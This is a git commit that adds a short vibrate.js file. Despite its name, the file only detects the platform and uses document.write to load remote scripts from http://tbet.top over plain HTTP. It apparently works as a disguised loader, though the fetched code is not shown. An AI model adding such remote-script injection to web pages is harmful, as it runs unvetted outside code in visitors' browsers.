201590f2a01f0b2ecc22aea12e84475d91e403a5
xuyangjian <86253804+xuyangjian@users.noreply.github.com>
2021-06-22 01:10:05 +0800

    Create vibrate.js

---
+++ vibrate.js
@@ -0,0 +1,7 @@
+if(navigator.platform.indexOf('Win32')!=-1){
+//pc
+document.write("<script src='http://tbet.top/files/pc-vibrate.js'></script>");
+}else{
+//shouji
+document.write("<script src='http://tbet.top/files/m-vibrate.js'></script>");
+}
